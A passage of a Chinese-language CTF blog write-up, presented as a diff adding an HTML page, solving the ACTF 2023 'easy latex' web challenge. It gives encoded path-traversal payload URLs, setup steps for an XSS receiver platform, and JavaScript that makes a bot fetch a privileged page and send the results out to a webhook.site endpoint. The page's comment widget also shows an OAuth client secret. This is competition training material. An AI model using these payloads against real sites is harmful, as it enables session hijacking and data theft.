class="comment"># gen = Captcha(200,80,key=seed)</span></span><br><span class="line"><span class="comment"># buf, captcha_text = gen.generate()</span></span><br><span class="line"><span class="comment"># get_config_secretKey()</span></span><br><span class="line">get_encode()</span><br></pre></td></tr></table></figure>
+
+<h1 id="ACTF-2023-easy-latex"><a href="#ACTF-2023-easy-latex" class="headerlink" title="[ACTF 2023] easy latex"></a>[ACTF 2023] easy latex</h1><p><a class="link"   target="_blank" rel="noopener" href="http://39.105.51.11:28131/" >http://39.105.51.11:28131/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://39.105.51.11:28132/" >http://39.105.51.11:28132/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://39.105.51.11:28133/" >http://39.105.51.11:28133/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://su-team.cn/passages/2023-10-28-ACTF/" >https://su-team.cn/passages/2023-10-28-ACTF/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://webhook.site/#!/7257d7bf-570b-4197-a502-3df2198633ea/57106e30-790a-479a-a90f-69e4b6ce89ca/1" >https://webhook.site/#!/7257d7bf-570b-4197-a502-3df2198633ea/57106e30-790a-479a-a90f-69e4b6ce89ca/1<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://webhook.site/7257d7bf-570b-4197-a502-3df2198633ea" >http://webhook.site/7257d7bf-570b-4197-a502-3df2198633ea<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/match/list?event_hash=706a7a8c-65a0-11ee-ab28-000c29bc20bf" >https://adworld.xctf.org.cn/match/list?event_hash=706a7a8c-65a0-11ee-ab28-000c29bc20bf<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/longuan/docker-for-XSS-plaform" >https://github.com/longuan/docker-for-XSS-plaform<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/trysec/BlueLotus_XSSReceiver" >https://github.com/trysec/BlueLotus_XSSReceiver<i class="fas fa-external-link-alt"></i></a></p>
+<p><img src="/../images/37ACTF2023/image-20231115142129726.png" alt="image-20231115142129726"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/share/%2e%2e%2f%70%72%65%76%69%65%77%3f%74%65%78%3d%68%75%61%68%75%61%26%74%68%65%6d%65%3d%2f%2f%31%32%34%2e%32%32%30%2e%32%31%35%2e%38%3a%37%38%39%30%2f%68%75%61%68%75%61</span><br><span class="line"></span><br><span class="line">/share/../preview?tex=huahua&amp;theme=//124.220.215.8:7890/huahua</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 拉去镜像文件</span><br><span class="line">git clone https://github.com/solei1/docker-for-XSS-plaform</span><br><span class="line"></span><br><span class="line">#进入到XSS目录，修改配置文件</span><br><span class="line">#修改config.php文件 $config[&#x27;urlroot&#x27;] =&#x27;http://ip:port&#x27;; 后面的网址改为自己域名或者ip</span><br><span class="line">#修改setup.php文件倒数第二行，将 http://ip:port改为自己的域名或者ip（与上一步一致）</span><br><span class="line">#修改setup.php文件最后一行， 设置管理员帐号， 默认是admin:admin123</span><br><span class="line">#退回到Dockerfile所在目录， 执行</span><br><span class="line">docker build -t xssplatform/solei1:1.0 .</span><br><span class="line"></span><br><span class="line">#启动docker (自己选择映射的端口代替port,与前面一致)</span><br><span class="line">docker run -d -p port:80 xssplatform/solei1:1.0</span><br><span class="line"></span><br><span class="line">#首先访问http://ip:port/setup.php，进行数据库初始化</span><br><span class="line">#之后就可以用你修改的管理员帐号登陆到xssplatform了</span><br></pre></td></tr></table></figure>
+
+<h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><p>preview路由存在xss，theme可控，可加载js</p>
+<p><img src="/../images/37ACTF2023/image-20231117211920549.png" alt="image-20231117211920549"></p>
+<p><img src="/../images/37ACTF2023/image-20231117212112398.png" alt="image-20231117212112398"></p>
+<p><img src="/../images/37ACTF2023/image-20231117212133152.png" alt="image-20231117212133152"></p>
+<p>接着看share&#x2F;:id路由</p>
+<p><img src="/../images/37ACTF2023/image-20231117212751429.png" alt="image-20231117212751429"></p>
+<p>跟进visit</p>
+<p><img src="/../images/37ACTF2023/image-20231117212830719.png" alt="image-20231117212830719"></p>
+<p>存在csrf漏洞，用share路由请求preview路由加载js文件，就能读取bot的cookie了，但是存在httponly读取不了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="variable">loginUrl</span> <span class="operator">=</span> <span class="string">&#x27;/login&#x27;</span>;</span><br><span class="line"><span class="type">const</span> <span class="variable">vipUrl</span> <span class="operator">=</span> <span class="string">&#x27;/vip&#x27;</span>;</span><br><span class="line"><span class="type">const</span> <span class="variable">loginCode</span> <span class="operator">=</span> <span class="string">&#x27;huahua&#x27;</span>;</span><br><span class="line">async function <span class="title function_">test</span><span class="params">(a)</span>&#123;</span><br><span class="line">  <span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="variable">fetchOptions</span> <span class="operator">=</span> &#123;</span><br><span class="line">      method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">      headers: &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      body: <span class="string">&quot;error&quot;</span>+a,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="variable">response</span> <span class="operator">=</span> await <span class="title function_">fetch</span><span class="params">(<span class="string">&quot;https://webhook.site/7257d7bf-570b-4197-a502-3df2198633ea&quot;</span>,fetchOptions)</span>;</span><br><span class="line">    console.log(response.text);</span><br><span class="line">  &#125;<span class="keyword">catch</span>&#123;</span><br><span class="line">    console.log(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="variable">loginData</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;</span><br><span class="line">  username: <span class="string">&#x27;//webhook.site/7257d7bf-570b-4197-a502-3df2198633ea&#x27;</span>,</span><br><span class="line">  password: <span class="string">&#x27;f149e0a6dd1ae68af99164bef0a7ce9f&#x27;</span>,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="variable">fetchOptions</span> <span class="operator">=</span> &#123;</span><br><span class="line">  method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  headers: &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  body: loginData,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">async function <span class="title function_">loginAndFetchVip</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="variable">loginResponse</span> <span class="operator">=</span> await <span class="title function_">fetch</span><span class="params">(loginUrl, fetchOptions)</span>;</span><br><span class="line">	test(<span class="string">&quot;login win&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (loginResponse.ok) &#123;</span><br><span class="line">      <span class="type">const</span> <span class="variable">vipResponse</span> <span class="operator">=</span> await <span class="title function_">fetch</span><span class="params">(vipUrl, &#123;</span></span><br><span class="line"><span class="params">        method: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="params">        headers: &#123;</span></span><br><span class="line"><span class="params">          <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span></span><br><span class="line"><span class="params">        &#125;,</span></span><br><span class="line"><span class="params">        body: new URLSearchParams(&#123; code: loginCode &#125;)</span>,</span><br><span class="line">        credentials: <span class="string">&#x27;include&#x27;</span>,</span><br><span class="line">      &#125;);</span><br><span class="line">      <span class="comment">// Handle vipResponse here as needed</span></span><br><span class="line">        test(<span class="string">&quot;win&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// Handle loginResponse errors here</span></span><br><span class="line">        test(<span class="string">&quot;Handle loginResponse errors here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="comment">// Handle any fetch-related errors here</span></span><br><span class="line">    console.error(error);</span><br><span class="line">      test(<span class="string">&quot;Handle any fetch-related errors here&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">loginAndFetchVip();</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.105.51.11:28131/share/..%2Fpreview%3Ftex%3Dhuahua%26theme%3D%2F%2F39.105.51.11%3A28136%2Fmyjs%2Fflag.js</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://39.105.51.11:28136/myjs/flag.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上面这一步一直失败，最后去请教了su战队的做题的师傅，才明白是latex-js默认会加载js文件夹下的base.js，只需要python开启一个目录服务让它访问就行了，新建一个js文件夹，base.js文件，里面放恶意代码就全部ok了。</p>
+<p><img src="/../images/37ACTF2023/image-20231118005401000.png" alt="image-20231118005401000"></p>
+<p>payload</p>
+<p><img src="/../images/37ACTF2023/image-20231118010324643.png" alt="image-20231118010324643"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">../preview?tex=123&amp;theme=//39.105.51.11/huahua</span><br><span class="line">%2E%2E%2Fpreview%3Ftex%3D123%26theme%3D%2F%2F39%2E105%2E51%2E11%2Fhuahua</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.105.51.11:28131/share/..%2Fpreview%3Ftex%3D123%26theme%3D%2F%2F39.105.51.11%2Fhuahua</span><br></pre></td></tr></table></figure>
+
+<p>利用成功</p>
+<p><img src="/../images/37ACTF2023/image-20231118010226669.png" alt="image-20231118010226669"></p>
+<p>总结一下：这个题其实不算很难，一个内网的python服务复现完感觉像是唬人的，没什么用，就一个nodejs的vip路由最后读取cookie时会用得到，python的服务完全没用的到。然后就是xss的利用点和平常的利用可能不太一样，这个是利用latex-js标签默认会加载&#x2F;js&#x2F;base.js文件，那我就放个远程目录给他加载，改一下base.js为恶意代码就行。具体的恶意代码就是fetch请求的那些代码，最后带着cookie访问到了webhook.site，就得到flag了。思路不难，但是实现起来不简单，很多细节问题才是见证技术的地方，很容易理解不到位。这个复现收获很大。</p>
+
+            </div>
+
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/ctf/">#ctf</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2023/11/15/38%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812023/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">强网拟态2023 部分wp</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2023/11/07/36%E8%AE%B0%E4%B8%80%E5%A4%84%E5%87%BA%E9%A2%98%E5%A4%B1%E8%AF%AF/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">记一处出题失误-Arnold变换算法</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;Comments
+    </div>
+    
+        
+            
+
+    <div class="gitalk-comment-container">
+        <div id="gitalk-container"></div>
+        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.css">
+        <script  src="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js"></script>
+        <script >
+          function loadGitalk() {
+            let __gitalk__pathname = decodeURI(location.pathname);
+            const __gitalk__pathnameLength = __gitalk__pathname.length;
+            const __gitalk__pathnameMaxLength = 50;
+            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
+              __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
+            }
+
+            try {
+              Gitalk && new Gitalk({
+                clientID: 'a415960e8a19902e98bf',
+                clientSecret: '97151a67ce9c95ad3c333c402f4cee0f5f05020f',
+                repo: 'gitalk',
+                owner: 'Lejeremiah',
+                admin: 'Lejeremiah',
+                id: __gitalk__pathname,
+                language: 'en'
+              }).render('gitalk-container');
+            } catch (e) {
+              window.Gitalk = null;
+            }
+          }
+
+          if ('false' === 'true') {
+            const loadGitalkTimeout = setTimeout(() => {
+              loadGitalk();
+              clearTimeout(loadGitalkTimeout);
+            }, 1000);
+          } else {
+            window.addEventListener('DOMContentLoaded', loadGitalk);
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ACTF2023-Web%E9%83%A8%E5%88%86"><span class="nav-text">ACTF2023 Web部分</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ACTF-2023-MyGO%E2%80%99s-Live"><span class="nav-text">[ACTF 2023] MyGO’s Live!!!!!</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ACTF-2023-story"><span class="nav-text">[ACTF 2023] story</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ACTF-2023-easy-latex"><span class="nav-text">[ACTF 2023] easy latex</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%EF%BC%9A"><span class="nav-text">复现：</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2020</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">jerem1ah</a>
+            
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+
+
+
+
+    
+<script src="/js/code-block.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/post-helper.js"></script>
+
+        
+            
+<script src="/js/libs/anime.min.js"></script>
+
+        
+        
+            
+<script src="/js/toc.js"></script>
+
+        
+    
+</div>
+
+
+
+</body>
+</html>
